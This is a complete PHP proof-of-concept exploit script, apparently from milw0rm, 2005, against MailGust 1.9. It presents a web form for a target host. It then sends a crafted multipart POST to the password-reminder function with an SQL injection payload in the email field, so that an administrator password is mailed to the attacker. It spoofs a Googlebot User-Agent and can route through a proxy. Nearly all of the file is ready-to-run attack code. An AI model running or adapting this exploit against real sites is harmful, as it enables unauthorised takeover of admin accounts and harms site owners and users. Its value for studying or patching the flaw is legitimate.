<?php

#   mailgust_xpl.php                                                           #
#                                                                              #
#   MailGust 1.9  ( possibly prior versions) SQL Injection / board takeover    #
#   poc exploit with generic HTTP proxy support                                #
#                                by rgod                                       #
#                      site: http://rgod.altervista.org                        #
#                                                                              #
#                                                                              #
#   make these changes in php.ini if you have troubles                         #
#   to launch this script:                                                     #
#   allow_call_time_pass_reference = on                                        #
#   register_globals = on                                                      #
#                                                                              #
#   usage: launch this script from Apache, fill requested fields, then         #
#   send yourself a new admin password right now!                              #
#                                                                              #
#   Sun-Tzu: "Hence to fight and conquer in all your battles is not supreme    #
#   excellence;  a supreme excellence consists in breaking the enemy's         #
#   resistance without  fighting."                                             #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<head><title>M a i l G u s t  v.1.9  S Q L   I n j e c t i o n</title><meta
http-equiv="Content-Type"  content="text/html; charset=iso-8859-1"> <style type=
"text/css"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}
.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }
.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;
font-style: italic; } --> </style></head> <body> <p class="Stile6">     MailGust
V 1.9 (possibly prior versions) SQL Injection / board takeover</p><p class="Stil
e6">a script by rgod at <a href="http://rgod.altervista.org"    target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%"> <form
name="form1"      method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
value&port=value&proxy=value&your_email=value"><p><input type="text" name="host"
><span class="Stile5"> hostname  (ex: www.sitename.com)  </span> </p> <p> <input
type="text" name="path"><span class="Stile5"> path ( ex: /mailgust/  or just / )
</span></p><p><input type="text"   name="port" >  <span class="Stile5">  specify
a  port  other  than  80  ( default value ) </span> </p> <p>  <input type="text"
name="your_email"> <span  class="Stile5"> e-mail where MG will send the password
</span></p><p><input type="text" name="proxy"> <span class="Stile5">send exploit
through an HTTP proxy (ip:port)</span></p> <p><input type="submit "name="Submit"
value="go!"></p></form></td></tr></table></body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}


$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';


function sendpacket($packet)
{
global $proxy, $host, $port, $html;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	    if (!eregi($proxy_regex,$proxy))
	    {echo htmlentities($proxy).' -> not a valid proxy...';
	     die;
	    }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo htmlentities($html);
}

function isemail($email)
   {
       $regex = '^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]{2,})+$';
       if (eregi($regex, $email)) return true;
       else return false;
   }

if (($path<>'') and ($host<>'') and ($your_email<>''))
{
  if ($port=='') {$port=80;}

$your_email=trim($your_email);
if (!isemail($your_email))
{
 echo '<br> I am not MailGust! You have to give me a valid e-mail...<br><br>';
 die;
}

$sql=$your_email.",'or'a'='a'/*@fakedomainname.com"; //wow it's a beautiful query ;)

$data='-----------------------------7d52b21b210554
Content-Disposition: form-data; name="method"

remind_password
-----------------------------7d52b21b210554
Content-Disposition: form-data; name="list"

maillistuser
-----------------------------7d52b21b210554
Content-Disposition: form-data; name="fromlist"

maillist
-----------------------------7d52b21b210554
Content-Disposition: form-data; name="frommethod"

showhtmllist
-----------------------------7d52b21b210554
Content-Disposition: form-data; name="email"

'.$sql.'
-----------------------------7d52b21b210554
Content-Disposition: form-data; name="submit"

Ok
-----------------------------7d52b21b210554--';
if ($proxy=='')
{$packet="POST ".$path."index.php HTTP/1.1\r\n";}
else
{$packet="POST http://".$host.$path."index.php HTTP/1.1\r\n";}
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."index.php?method=remind_password_form&list=maillistuser&fromlist=maillist&frommethod=showhtmllist\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d52b21b210554\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: globalUserId=1745493597; gustTimeOut=1\r\n\r\n";
$packet.=$data;
show($packet);
sendpacket($packet);
}
else
{
echo '<br>Fill in requested fields, optionally specify a proxy...<br><br>';
}
?>

# milw0rm.com [2005-09-24]